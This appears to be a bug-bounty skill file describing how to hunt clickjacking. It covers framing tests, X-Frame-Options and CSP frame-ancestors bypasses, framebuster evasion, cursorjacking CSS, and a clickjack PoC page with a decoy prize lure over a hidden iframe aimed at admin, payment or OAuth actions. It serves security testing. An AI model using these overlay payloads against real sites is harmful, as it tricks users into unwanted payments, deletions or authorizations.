---
name: hunt-clickjacking
description: Hunt Clickjacking — X-Frame-Options bypass, CSP frame-ancestors bypass, invisible iframe overlays, UI redressing, cursorjacking, framebusting evasion. High when chained to CSRF or ATO. Use when testing any page with sensitive actions.
sources: hackerone_public
---

# HUNT-CLICKJACKING — Clickjacking / UI Redressing

## Crown Jewel Targets

Clickjacking alone is Low-Medium. Chained to CSRF or DOM manipulation it becomes High-Critical.

- **Login flows** — overlay fake credentials form on top of real OAuth button
- **Payment confirmation** — hidden iframe clicks "Confirm Payment" while victim clicks "Cancel"
- **Account settings** — overlay "Delete Account" or "Change Email" under a decoy button
- **Admin actions** — hidden iframe triggers user ban, role change, or content publish
- **OAuth authorization** — victim authorizes attacker's app unknowingly

## Attack Surface Signals

```
X-Frame-Options: (missing or ALLOW-FROM)
Content-Security-Policy: (missing frame-ancestors)
framebuster: (can be bypassed)
```

## Step-by-Step Hunting Methodology

### Phase 1 — Test Framing

```html
<!-- Test if page can be framed -->
<iframe src="https://target.com/admin/delete-user" width="500" height="500"></iframe>
```

If the iframe renders the page, the page is framable. Check response headers:
- Missing `X-Frame-Options` AND missing `CSP frame-ancestors` → vulnerable

### Phase 2 — Bypass Existing Protections

```bash
# Test X-Frame-Options ALLOW-FROM (deprecated, Chrome ignores)
# Bypass via iframe sandbox
<iframe sandbox="allow-forms allow-scripts" src="..."></iframe>

# Bypass CSP frame-ancestors via redirect chain
# Find an open redirect on target.com that redirects to your evil page
# If frame-ancestors allows target.com, the redirect inherits the CSP
```

### Phase 3 — Chaining

```javascript
// Top-window navigation to disable framebusters
window.onbeforeunload = function() { /* disable unload */ }

// Two-click attack overlays
// Layer 1: transparent iframe with the target action button positioned exactly
// Layer 2: decoy button victim thinks they're clicking
```

### Phase 4 — Cursorjacking / Pointer Capture

```css
/* CSS cursorjacking — hide cursor, reposition target element */
#decoy {
  position: absolute;
  top: 100px;
  left: 100px;
  opacity: 0;
}
#target {
  position: fixed;
  pointer-events: none;
}
```

## Payload Templates

```html
<!-- Basic clickjack PoC -->
<!DOCTYPE html>
<html>
<head><title>Clickjack PoC</title></head>
<body>
  <h1>Click here to win a prize!</h1>
  <iframe src="https://target.com/admin/action" style="opacity:0;position:absolute;top:100px;left:100px;width:500px;height:500px;"></iframe>
</body>
</html>

<!-- With CSRF token leaking via DOM -->
<iframe src="https://target.com/settings" id="victim" onload="extractToken()"></iframe>
```

## Common Root Causes

- `X-Frame-Options` entirely missing
- `CSP frame-ancestors` missing or set to wildcard
- `X-Frame-Options: ALLOW-FROM` (Chrome ignores it, doesn't actually protect)
- CSP bypassed via same-origin redirect chain
- Framebusters (`if (top != self)`) defeated by `sandbox` iframe or `onbeforeunload`

## Gate 0 Validation

- [ ] Can the page be framed (header check + live test)?
- [ ] What sensitive action can be triggered by a single click?
- [ ] Is there a CSRF token that needs to be leaked first?
- [ ] Have I documented the full exploit HTML?
